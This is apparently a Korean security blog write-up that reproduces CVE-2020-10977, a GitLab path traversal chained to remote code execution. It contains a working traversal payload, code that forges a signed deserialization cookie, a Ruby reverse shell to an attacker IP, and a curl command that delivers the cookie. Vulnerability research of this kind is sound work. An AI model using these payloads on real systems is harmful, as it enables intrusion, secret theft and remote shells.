---
title: Arbitrary file read to Remote Code Execution in gitlab before 12.9.0 (CVE-2020-10977)
author: Chanyoung So
date: 2021-05-16 17:00:00 +0900
categories: [N-day & BugBounty review, GitLab]
tags: [Security, BugBounty, 1-day, GitLab]
image:
  src: https://user-images.githubusercontent.com/19899140/118505953-db147e80-b767-11eb-9322-321c4a4189d5.png
---

GitLab에서 임의파일 읽기 취약점을 통해 RCE까지 trigger되는 1-day 취약점이 있어 분석하고 exploit을 재현하는 과정을 작성한다. 본 취약점은 GitLab 내 프로젝트 이슈를 타 프로젝트로 이동할 때 호출되는 UploadsRewrite 함수에서 파일 이름에 대한 별도의 필터가 없어 path traversal이 발생한다. 이 path traversal로 인해 공격자는 GitLab의 모든 파일을 읽을 수 있다. 그리고 이 파일 중 command를 실행할 때 필요한 secret 값이 저장된 file을 임의 파일 읽기 취약점을 통해 read한 후 remote code execution을 trigger할 수 있다.



# Information

- Vulnerable target
  - Before GitLab CE/EE 12.9.0
- Bounty
  - $20,000
- Weakness
  - Path traversal to arbitrary file read

- Severity
  - Critical(9~10)



# Preparations

취약점 재현을 위해 Docker를 사용하였다.

먼저 GitLab docker관련 파일이 필요하다.

GitLab은 docker 이미지를 공식적으로 제공하고 있다. 따라서 docker-compose 파일에 설정 값을 세팅하고 docker를 실행하면 쉽게 GitLab을 구축할 수 있다.

자세한 내용은 [공식문서](https://docs.gitlab.com/omnibus/docker/#install-gitlab-using-docker-compose)를 참조하자.



### docker-compose.yml

- gitlab 버전을 명시한 docker-compose 파일 생성

```
web:
       image: "gitlab/gitlab-ce:12.9.0-ce.0"
       restart: always
       hostname: "gitlab.example.com"
       environment:
        GITLAB_OMNIBUS_CONFIG: external_url 'http://0.0.0.0'
       # Add any other gitlab.rb configuration here, each on its own line
       ports:
        - "50003:80"
        - "443:443"
        - "22:22"
       volumes:
        - "$GITLAB_HOME/config:/etc/gitlab"
        - "$GITLAB_HOME/logs:/var/log/gitlab"
        - "$GITLAB_HOME/data:/var/opt/gitlab"
```

### Add environment variable for gitlab repository

```bash
echo "export GITLAB_HOME=/srv/gitlab" # for linux user" >> ~/.bashrc
source ~/.bashrc
```

### Install and run gitlab with docker 

- sudo로 도커를 실행할 경우 환경변수 이슈로 -E 옵션을 추가

```bash
sudo -E docker-compose up -d
```

### Check Docker logs

```bash
sudo docker-compose logs -f
```

- GitLab log를 확인하고, 서버 실행이 완료될 때 까지 대기한다.

![image-20210512000738162](https://user-images.githubusercontent.com/19899140/118389292-3cebc000-b664-11eb-954a-1787370f36ea.png)

### Open GitLab service

- 브라우저에 GitLab IP(0.0.0.0:50003)를 입력하고 접속이 되면 테스트 계정을 생성하고 로그인 한다.

![image-20210512001915639](https://user-images.githubusercontent.com/19899140/118389306-5d1b7f00-b664-11eb-87dc-a81466ea697f.png)





# Arbitrary File Read (CVE-2020-10977)

### Attack vector description

프로젝트 issue를 다른 프로젝트로 이동할 때 `UploadsRewriter` 에서 기존 issue에 포함된 파일 이름에 대한 유효성 필터를 적용하지 않아 해당 파일 이름에서  path traversal이 발생한다.



 `/gitlab/app/uploaders/file_uploader.rb` 에 GitLab의 markdown 패턴이 정의되어 있다.

```ruby
# /gitlab/app/uploaders/file_uploader.rb
MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
```



하지만 프로젝트 이슈 이동을 처리하는 로직에서는 사용자 입력 값이 초기화되는 `file` 변수가 필터를 거치지 않는 것을 확인할 수 있다.

따라서 해당 부분에서 path traversal이 발생한다.

```ruby
# /gitlab/lib/gitlab/gfm/uploads_rewriter.rb
   @text.gsub(@pattern) do |markdown|
          file = find_file(@source_project, $~[:secret], $~[:file])
          break markdown unless file.try(:exists?)

          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
          moved = klass.copy_to(file, target_parent)
...
   def find_file(project, secret, file)
        uploader = FileUploader.new(project, secret: secret)
        uploader.retrieve_from_store!(file)
        uploader
      end
```

### Reproduction

1. 두 개의 프로젝트 생성

   ![image-20210512011035489](https://user-images.githubusercontent.com/19899140/118389354-905e0e00-b664-11eb-9b24-eb55c3d607c9.png)

   

1. path traversal payload를 첫 번째 프로젝트 이슈에 작성

   ```markdown
   ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
   ```

   ![image-20210513001644110](https://user-images.githubusercontent.com/19899140/118389366-a075ed80-b664-11eb-9259-8eb3bad5a1ba.png)
   
   

3. 두 번째 프로젝트의 이슈로 payload 이동

   <img src="https://user-images.githubusercontent.com/19899140/118389379-ae2b7300-b664-11eb-9fc4-33fc00c1ef5c.png" style="zoom:150%;" />

   

4. 두 번째 프로젝트 이슈에 /etc/passwd 파일 노출

   <img src="https://user-images.githubusercontent.com/19899140/118389397-c3a09d00-b664-11eb-9f2a-37264a781104.png" style="zoom:110%;" />

   

5. /etc/passwd 파일 읽기

   <img src="https://user-images.githubusercontent.com/19899140/118389410-d1562280-b664-11eb-9db2-95ae0ae70e89.png" style="zoom:90%;" />



# Remote code Execution

### Attack vector description

*임의 파일 취약점을 통해 공격자는 token, 민감 데이터, config 파일 등 gitlab 서버 내 중요한 파일을 모두 읽을 수 있다.*



cookies_serializer가 :hybrid로 초기화하여 RCE를 유발한다.

```ruby
# /gitlab-foss/config/initializers/cookies_serializer.rb
# Be sure to restart your server when you modify this file.

Rails.application.config.action_dispatch.use_cookies_with_metadata = true
Rails.application.config.action_dispatch.cookies_serializer = :hybrid
```



*cookie를 직렬화 할 때 cookie 값에 erb 템플릿  내  명령실행코드가 삽입된 cookie를 주입하면서 command execution이 trigger 되는 것으로 추정된다. 코드를 100% 분석하지 않아서 추가적으로 분석을 진행할 예정이다*



### Reproduction

1. 공격대상 GitLab에서 Arbitrary file read 취약점으로 `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` 의 `secret_key_base` 값을 탈취한다.

   ![image-20210516152637890](https://user-images.githubusercontent.com/19899140/118389430-e763e300-b664-11eb-9142-ff0119e1a712.png)



2. 탈취한 `secret_key_base` 값을 공격자가 구축한 GitLab의 `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`에 변경한다.

   

3. 공격자의 GitLab 인스턴스에서 rails console을 실행하고 아래 코드를 실행하면 RCE payload를 생성할 수 있다.

   #### Run gitlab-rails console in docker-compose

   ```
   sudo docker exec -it [my container] /bin/bash
   
   gitlab-rails console
   ```

   <img src="https://user-images.githubusercontent.com/19899140/118389439-f480d200-b664-11eb-972a-ecc3ae68435e.png" style="zoom:150%;" />

   

   #### Reverse shell payload for Ruby

   ```ruby
   ruby -rsocket -e'exit if fork;c=TCPSocket.new("192.168.59.134","9001");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
   ```

   

   #### Generatig payload

   ```ruby
   request = ActionDispatch::Request.new(Rails.application.env_config)
   request.env["action_dispatch.cookies_serializer"] = :marshal
   cookies = request.cookie_jar
   
   erb = ERB.new("<%= `ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"192.168.59.134\",\"9001\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'` %>")
   depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
   cookies.signed[:cookie] = depr
   puts cookies[:cookie]
   ```

   <img src="https://user-images.githubusercontent.com/19899140/118389459-0ebab000-b665-11eb-93d5-5e48527734e1.png" style="zoom:150%;" />



4. 3의 과정을 통해 cookie를 생성한다. 이 cookie를 target gitlab 서버의 experimentation_subject_id 파라미터로 전송한다.

   ```
   curl -vvv 'http://0.0.0.0:50003/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAg4BI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHJ1YnkgLXJzb2NrZXQgLWUnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiMTkyLjE2OC41OS4xMzQiLCI5MDAxIik7bG9vcHtjLmdldHMuY2hvbXAhOyhleGl0ISBpZiAkXz09ImV4aXQiKTsoJF89fi9jZCAoLispL2k/KERpci5jaGRpcigkMSkpOihJTy5wb3BlbigkXyw/cil7fGlvfGMucHJpbnQgaW8ucmVhZH0pKXJlc2N1ZSBjLnB1dHMgImZhaWxlZDogIn0nYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--70bb521c1e9d926094614425ddcd8da195f4dd8f"
   ```



5. cookie를 전송하면 reverse shell code가 trigger되면서 RCE를 수행한다.

   ![image-20210516162334984](https://user-images.githubusercontent.com/19899140/118389497-2abe5180-b665-11eb-808e-ca9daeeabcb9.png)



### Fullchain attack scenarios

- Arbitrary file read -> RCE -> LPE to root

- Arbitrary file read -> reset admin password -> get ssh key -> LPE to root

  

### Reference

- https://hackerone.com/reports/827052

- https://gitlab.com/gitlab-org/gitlab/-/issues/212175

- https://gitlab.com/gitlab-org/gitlab/-/commit/7cb0e02a9392d2d7abd8e3941c6127aa7e7bd240#5f0477280d218b25de26ddd2af0e8a5a706a76ed

- https://github.com/thewhiteh4t/cve-2020-10977